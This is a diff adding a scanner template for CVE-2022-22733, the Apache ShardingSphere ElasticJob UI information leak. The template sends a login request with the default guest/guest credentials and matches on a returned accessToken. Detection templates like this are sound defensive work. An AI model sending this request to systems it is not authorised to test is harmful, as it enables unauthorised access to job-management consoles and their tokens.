@@ -1,0 +1,31 @@
+id: apache-shardingsphere-elasticjob-ui-sensitive-information-leak
+
+info:
+  name: Apache ShardingSphere ElasticJob UI Sensitive Information Leak Vulnerability (CVE-2022-22733)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: cve-2022-22733,info-leak
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"username":"guest","password":"guest"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"isGuest":true'
+          - "accessToken"
+      - type: word
+        part: header
+        words:
+          - "application/json"
